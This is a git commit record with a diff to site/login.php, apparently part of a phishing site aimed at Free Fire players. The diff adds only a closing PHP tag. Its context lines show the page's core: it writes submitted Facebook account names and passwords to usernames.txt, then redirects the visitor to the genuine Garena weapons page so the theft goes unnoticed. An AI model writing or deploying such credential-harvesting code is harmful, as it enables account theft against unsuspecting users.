85e4911d09cd1c1e27b15c63a699fe4d35ed1a78
WongBiasa <74451855+WongBiasa@users.noreply.github.com>
2021-01-13 18:16:29 +0700

    Update login.php

--- site/login.php
+++ site/login.php
@@ -3,3 +3,4 @@
 file_put_contents("usernames.txt", "akun: " . $_POST['facebook'] . "Account: " . $_POST['text'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location : https://ff.garena.com/weapons/index/en/')
 exit();
+?>
